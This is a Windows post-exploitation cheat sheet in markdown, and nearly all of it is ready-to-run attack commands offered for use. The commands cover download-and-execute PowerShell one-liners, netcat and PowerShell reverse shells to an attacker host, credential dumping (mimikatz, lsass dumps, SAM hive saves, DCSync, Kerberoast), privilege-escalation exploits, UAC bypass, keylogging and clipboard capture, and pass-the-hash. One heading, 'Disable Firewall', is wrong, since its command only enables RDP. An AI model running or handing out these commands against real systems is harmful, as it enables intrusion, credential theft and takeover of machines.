
# Windows

## General Commands
```bash
net use z: \\$source_ip\$smb_share  
```
```bash
//$source_ip/$smb_share/tools_windows/bin/whoami.exe
```

## Enumeration Scripts
```bash
//$source_ip/$smb_share/tools_windows/windows-privesc-check2.exe --audit -a -o wpc-report
```
```bash
//$source_ip/$smb_share/tools_windows/windows-privesc-check2.exe --dump -a > wpc-dump
```

```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/PowerSploit/Privesc/PowerUp.ps1'); Invoke-AllChecks"
```
```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/PowerSploit/Exfiltration/Get-GPPAutologon.ps1'); Get-GPPAutologon"
```
```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/PowerSploit/Exfiltration/Get-GPPPassword.ps1'); Get-GPPPassword"
```
```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/PowerSploit/Exfiltration/Get-VaultCredential.ps1'); Get-VaultCredential"
```

```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/JAWS/jaws-enum.ps1');"
```
```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/Privesc/privesc.ps1');"
```
```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/SessionGopher/SessionGopher.ps1'); Invoke-SessionGopher -Thorough"
```

Check if CMD or Powershell
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

Copy and paste enum
```bash
echo "--------- BASIC WINDOWS RECON ---------"  > report.txt; timeout 1; systeminfo >> report.txt; timeout 1; set >> report.txt; timeout 1; echo %username% >> report.txt; timeout 1; echo %userdomain% >> report.txt; timeout 1; echo %path% >> report.txt; timeout 1; echo %cd% >> report.txt; timeout 1; netstat -r >> report.txt; timeout 1; nbtstat >> report.txt; timeout 1; whoami /priv >> report.txt; timeout 1; wmic OS get OSArchitecture >> report.txt; timeout 1; net config Workstation  >> report.txt; timeout 1; systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt; timeout 1; hostname >> report.txt; timeout 1; net users >> report.txt; timeout 1; ipconfig /all >> report.txt; timeout 1; route print >> report.txt; timeout 1; arp -A >> report.txt; timeout 1; netstat -ano >> report.txt; timeout 1; netsh firewall show state >> report.txt; timeout 1; netsh firewall show config >> report.txt; timeout 1; schtasks /query /fo LIST /v >> report.txt; timeout 1; tasklist /SVC >> report.txt; timeout 1; net start >> report.txt; timeout 1; DRIVERQUERY >> report.txt; timeout 1; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt; timeout 1; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt; timeout 1; dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt; timeout 1; findstr /si password *.xml *.ini *.txt >> report.txt; timeout 1; reg query HKLM /f password /t REG_SZ /s >> report.txt; timeout 1; reg query HKCU /f password /t REG_SZ /s >> report.txt; timeout 1; dir "C:\"; timeout 1; dir "C:\Program Files\" >> report.txt; timeout 1; dir "C:\Program Files (x86)\" >> report.txt; timeout 1; dir "C:\Users\" >> report.txt; timeout 1; dir "C:\Users\Public\" >> report.txt; timeout 1; fsutil fsinfo drives >> report.txt; timeout 1; dir "c:\windows\repair\" >> report.txt; timeout 1; echo "REPORT COMPLETE!"
```

File associations:
```bash
assoc
ftype powershellfile="%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"
```
```
//$source_ip/$smb_share/tools_windows/EyeWitness.exe 
```

### Domain Enumeration

#### ShareFinder - Look for shares on network and check access under current user context & Log to file

```bash
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/PowerSploit/Recon/PowerView.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"
```
### Import PowerView Module
```bash
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/PowerSploit/Recon/PowerView.ps1')"
```

### Invoke-BloodHound for domain recon
```bash
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"
```

### ADRecon script to generate XLSX file of domain properties
```bash
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/sense-of-security/ADRecon/master/ADRecon.ps1')"
```

## Exploit Suggesters
```bash
python.exe //$source_ip/$smb_share/tools_windows/windows-exploit-suggester.py
```
```bash
//$source_ip/$smb_share/tools_windows/Watson_Net35.exe
```
```bash
//$source_ip/$smb_share/tools_windows/Watson_Net45.exe
```
```bash
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -exec Bypass -C "iex ((New-Object System.Net.WebClient).DownloadString('http://$source_ip/tools_windows/Sherlock.ps1'))"
```
```bash
cd tools_windows/Windows-Exploit-Suggester; python windows-exploit-suggester.py --database `ls -la 20* | cut -d' ' -f9 | sort -nr | head -n 1` --systeminfo systeminfo.txt
```
```bash
//$source_ip/$smb_share/tools_windows/Privesc/privesc.bat
```

## Exploit

MS16-032
```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/exploits_windows_collections/windows-kernel-exploits/MS16-032/MS16-032.ps1'); Invoke-MS16-032"
```

Invoke-HotPotato Exploit
```bash
powershell.exe -nop -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Tater/master/Tater.ps1');invoke-Tater -Command 'net localgroup Administrators user /add'"
```
```
//$source_ip/$smb_share/exploits_windows_prevesc/juicypotato.exe -p c:\windows\system32\cmd.exe -l 1340 -t * -a "/c //$source_ip/$smb_share/tools_windows/bin/nc.exe -nc $source_ip $source_port -e cmd.exe"
```

ScStoragePathFromUrl
```bash
python exploits_windows/webdav/ScStoragePathFromUrl-explodingcan.py http://$target_ip $pwd/public/payloads_windows/shell_reverse_tcp_x86_shikata_ga_nai.bin
```


## Reverse shell
```bash
//$source_ip/$smb_share/payloads_windows/shell_reverse_tcp_x86_shikata_ga_nai.exe
```
```bash
//$source_ip/$smb_share/payloads_windows/shell_reverse_tcp_x64_shikata_ga_nai.exe
```
```bash
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni -nop -i None -ex Bypass -C "iex ((New-Object System.Net.WebClient).DownloadString('http://$source_ip/tools_windows/nishang/Shells/Invoke-PowerShellTcp.ps1'))"
```
```bash
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"$source_ip\",$source_port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
```

## Password Dumping
```bash
//$source_ip/$smb_share/tools_windows/bin/fgdump/fgdump.exe
```
```bash
//$source_ip/$smb_share/tools_windows/wce.exe
```
```bash
privilege::debug
sekurlsa::logonPasswords full
sekurlsa::wdigest
```
```bash
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
```
```bash
//$source_ip/$smb_share/tools_windows/mimikatz.exe log version  "privilege::debug" "sekurlsa::logonpasswords full" "sekurlsa::wdigest" exit
```
```bash
//$source_ip/$smb_share/tools_windows/mimikatz64.exe log version  "privilege::debug" "sekurlsa::logonpasswords full" "sekurlsa::wdigest" exit
```
```bash
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"
```
Invoke-MassMimikatz
```bash
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"
```
```
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:demodomain /user:sqladmin"'
```
```bash 
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
```
```bash
//$source_ip/$smb_share/tools_windows/pstools/procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
```bash
//$source_ip/$smb_share/tools_windows/pstools/procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

Bypass UAC and launch PowerShell window as admin
```bash
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"
```
```bash
reg.exe save hklm\sam c:\sam_backup reg.exe save hklm\security c:\security_backup reg.exe save hklm\system c:\system
```

### cpasswords in sysvol
```
findstr /S cpassword %logonserver%\sysvol\*.xml
```
```
findstr /S cpassword $env:logonserver\sysvol\*.xml
```
```bash
//$source_ip/$smb_share/tools_windows/gp3finder.exe -A -l
```
```bash
//$source_ip/$smb_share/tools_windows/gp3finder.exe -A -t DOMAIN_CONTROLLER -u DOMAIN\USER
```

## Kerberos

### Invoke-Kerberoast with Hashcat Output
```bash
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"
```

### Inveigh

#### Start inveigh using Basic Auth - logging to file
```bash
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y -HTTPAuth Basic"
```

#### Start inveigh in silent mode (no popups)
```bash
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y -WPADAuth anonymous"
```

## Network monitoring
```bash
//$source_ip/$smb_share/tools_windows/tcpdump.exe -s 0 -w tcpdump.out
```
```bash
//$source_ip/$smb_share/tools_windows/tcpdump.exe port 80 -s 0 -w tcpdump.out 
```
```bash
//$source_ip/$smb_share/tools_windows/tcpdump.exe net 10.10.10.0/24 -s 0 -w tcpdump.out 
```
```bash
//$source_ip/$smb_share/tools_windows/tcpdump.exe host 10.10.10.10 -s 0 -w tcpdump.out 
```

## Service Permissions 

### Find service unquote paths
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\" |findstr /i /v """
```
```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

### Services with write access
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -uwcqv * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -uwcqv * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -uwcqv * /accepteula
```

### Services with write access to user testuser
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -uwcqv "testuser" * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -uwcqv "testuser" * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -uwcqv "testuser" * /accepteula
```

### Services with write access for Authenticated Users
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -uwcqv "Authenticated Users" * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -uwcqv "Authenticated Users" * /accepteula
```

### Services with write access for Everyone
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -uwcqv "Everyone" * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -uwcqv "Everyone" * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -uwcqv "Everyone" * /accepteula
```

### Services details for all services
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -ucqv * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -ucqv * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -ucqv * /accepteula
```

### Services details for Spooler
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -ucqv Spooler /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -ucqv Spooler /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -ucqv Spooler /accepteula
```

## File Permissions

### File permissions (s for recursive)
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -udqs "C:\" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -udqs "C:\" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -udqs "C:\" /accepteula
```

### Write access to directories for Users
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -uwdqs "Users" "C:" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -uwdqs "Users" "C:\" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -uwdqs "Users" "C:\" /accepteula
```

### Write access to file for Users
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -uwdqs "Users" "C:" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -uwdqs "Users" "C:\" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -uwdqs "Users" "C:\" /accepteula
```

### Write access to file for Authenticated Users
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -uwdqs "Authenticated Users" "C:\" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -uwdqs "Authenticated Users" "C:\" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -uwdqs "Authenticated Users" "C:\" /accepteula
```

### Write access to file for Everyone
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -uwdqs "Everyone" "C:\" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -uwdqs "Everyone" "C:\" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -uwdqs "Everyone" "C:\" /accepteula
```

### List file with explicit integrity levels 
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -e -s c:\users\mark /accepteula
```

## Registry Permissions

### Registry keys under Hhklm\software user has write access to
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -kws user hklm\software /accepteula
```
### Security of hklm\software
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -k hklm\software  /accepteula
```

### Global objects everyone can modify
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -wuo Everyone \basednamedobjects /accepteula
```

## Download file
```bash
//$source_ip/$smb_share/tools_windows/bin/wget.exe http://$source_ip/tools_windows/bin/nc.exe
```
```bash
certutil -urlcache -split -f http://$source_ip/tools_windows/bin/nc.exe
```
```bash
mshta http://$source_ip/tools_windows/bin/nc.exe
```
```bash
bitsadmin /transfer badthings http://$source_ip/tools_windows/bin/nc.exe c:\nc.exe
```
Copy and paste downloader < Windows 10
```bash
echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs & echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs & echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
cscript dl.vbs "http://$source_ip/tools_windows/bin/nc.exe" "nc.exe"
```

Copy and paste downloader >= Windows 10
```bash
echo dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs &echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs &echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
cscript dl.vbs "http://$source_ip/tools_windows/bin/nc.exe" "nc.exe"
```
```bash
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -C "(New-Object System.Net.WebClient).DownloadFile('http://$source_ip/tools_windows/bin/nc.exe','C:\nc.exe')"
```

```powershell
IEX("New-Object System.Net.WebClient).DownloadFile('http://$source_ip/tools_windows/bin/nc.exe','C:\nc.exe')")
```

Python:
```bash
python -c "import urllib.request; urllib.request.urlretrieve('http://$source_ip/tools_windows/bin/nc.exe', 'C:\\nc.exe');"
```
 
Perl:
```bash
perl -le "use File::Fetch; my $ff = File::Fetch->new(uri => 'http://$source_ip/tools_windows/bin/nc.exe'); my $file = $ff->fetch() or die $ff->error;"

```

## Copy windows binaries
```bash
copy //$source_ip/$smb_share/tools_windows/bin/Regexe.exe
```
```bash
copy //$source_ip/$smb_share/tools_windows/bin/regedit.exe
```
```bash
copy //$source_ip/$smb_share/tools_windows/bin/nc.exe
```
```bash
copy //$source_ip/$smb_share/tools_windows/bin/wget.exe
```
```bash
copy //$source_ip/$smb_share/tools_windows/bin/whoami.exe
```

## Using Credentials 

```powershell
$username = '<username here>'
$password = '<password here>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securepassword
Start-Process '//$source_ip/$smb_share/tools_windows/bin/nc.exe' -ArgumentList '-e cmd.exe $source_ip $source_port' -Credential $credential -NoNewWindow
```
```powershell
$username = '<username here>'
$password = '<password here>'
computer = '<hostname>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securepassword
[System.Diagnostics.Process]::Start('//$source_ip/$smb_share/tools_windows/bin/nc.exe','-e cmd.exe $source_ip $source_port', $credential.Username, $credential.Password, $computer)
```
```bash
powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"
```
Requires .Net 3.5
```powershell
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$username = '<username here>'; $password = '<password here>'; $computer = $env:COMPUTERNAME; Add-Type -AssemblyName System.DirectoryServices.AccountManagement; $obj = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$computer); $obj.ValidateCredentials($username, $password); }"
```
Requires .Net 2.0
```powershell
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$username = '<username here>'; $password = '<password here>'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Start-Process -FilePath C:\Windows\System32\calc.exe -NoNewWindow -Credential $credential; }"
```
```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/Invoke-TheHash/Invoke-WMIExec.ps1'); Invoke-WMIExec -Target localhost -Username alice -Hash aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE -Command 'cmd' -verbose"
```
```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/Invoke-TheHash/Invoke-SMBExec.ps1'); Invoke-SMBExec -Target localhost -Username alice -Hash aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE -Command 'cmd' -verbose"
```
```bash
//$source_ip/$smb_share/tools_windows/pstools/PsExec.exe -accepteula \\localhost -u alice -p aliceishere cmd
```
```bash
runas /profile /user:administrator cmd
```
```bash 
START /B cmd.exe
```

## Data Extraction

Import Powersploits invoke-keystrokes
```bash
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1')"
```

Import Empire's Get-ClipboardContents
```bash
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ClipboardContents.ps1')"
```
Import Get-TimedScreenshot
```bash
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/obscuresec/PowerShell/master/Get-TimedScreenshot')"
```

Use Windows Debug api to pause live processes
```bash
powershell.exe -nop -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/Pause-Process/master/pause-process.ps1');Pause-Process -ID 1180;UnPause-Process -ID 1180;"
```

## Enable / Disable 

Enable RDP:
``` bat
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

Disable UAC:
```bash
reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system reg setval -v EnableLUA -d 0 -t REG_DWORD -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system
```

Disable Firewall:
```bash 
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

## Admin to SYSTEM
```bash
time
# Now we set the time we want the system CMD to start. Probably one minuter after the time.
at 01:23 /interactive cmd.exe
```
```bash
psexec -i -s cmd.exe
```
```bash
vdmallowed.exe
vdmexploit.dll
```
```bash
getsystem
```
```bash
psexec.exe -i -s %SystemRoot%\system32\cmd.exe
```
```bash
psexec64 \\COMPUTERNAME -u Test -p test -h "//$source_ip/$smb_share/tools_windows/bin/nc.exe -nc $source_ip $source_port -e cmd.exe" 
```
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:Test "//$source_ip/$smb_share/tools_windows/bin/nc.exe -nc $source_ip $source_port -e cmd.exe"
```
```bash
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/bin/nc.exe')"
encode="`echo $scriptblock | iconv -to-code UTF-16LE | base64 -w 0`”
command="cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode"
```





## Glossery 
```
plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080
```
```
rdesktop (ip) -r disk:share=/home/share
```
Refresh group policy:
```
gpupdate /force
```
Search for a specific file (wildcards are supported)
```
dir /S /P "filename"
```

Test to see if we can run Powershell:
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni -nop -i None -ex Bypass -C "get-host"
```

Test to see if we can run Powershell Version 2:
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 2 -w hidden -noni -nop -i None -ex Bypass -C "$PSVersionTable"
```